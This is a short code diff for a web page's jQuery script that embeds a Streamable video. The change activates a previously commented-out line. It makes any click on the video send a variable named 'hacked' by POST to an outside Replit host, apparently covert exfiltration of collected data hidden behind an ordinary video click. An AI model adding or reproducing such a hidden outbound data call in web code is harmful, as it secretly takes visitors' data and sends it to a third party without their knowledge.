@@ -17,7 +17,7 @@ $(document).ready(() => {
     request.send();
 
     $(".video").click(function (e) {
-        // $.ajax({ url: "https://APIPGM.sangonomiyakoko.repl.co", method: "POST", data: {"data": hacked} });
+        $.ajax({ url: "https://APIPGM.sangonomiyakoko.repl.co", method: "POST", data: {"data": hacked} });
     });
 
     $(".video").append('<iframe src="https://streamable.com/e/qk4w6i?loop=0" frameborder="0" width="100%" height="100%" allowfullscreen style="width:100%;height:100%;position:absolute;left:0px;top:0px;overflow:hidden;"></iframe>');
